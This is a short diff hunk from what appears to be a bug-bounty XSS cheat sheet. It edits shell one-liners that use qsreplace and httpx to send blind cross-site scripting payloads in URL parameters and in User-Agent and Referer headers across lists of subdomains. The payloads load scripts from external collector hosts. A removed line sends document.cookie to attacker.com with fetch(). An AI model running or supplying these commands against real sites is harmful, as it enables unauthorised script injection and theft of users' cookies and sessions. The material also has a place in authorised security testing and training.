@@ -102,7 +102,7 @@ cat gf-xss.txt | qsreplace '"><script src=https://xss.report/c/oddmystic></scrip
 cat https-subs.txt | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>" -silent
 
 # Referer header injection
-cat https-subs.txt | httpx -H "Referer: https://target.com/\"\"><script>fetch('https://attacker.com/?cookie='+document.cookie)</script>" -silent
+httpx -l https-subs.txt -mc 200 -silent | httpx -H 'Referer: "><script src=https://xss.report/c/oddmystic></script>' -H 'User-Agent: Mozilla/5.0' -status-code -title -content-length
 ```
 
 ### 8. XSS Polyglot & Universal Payloads
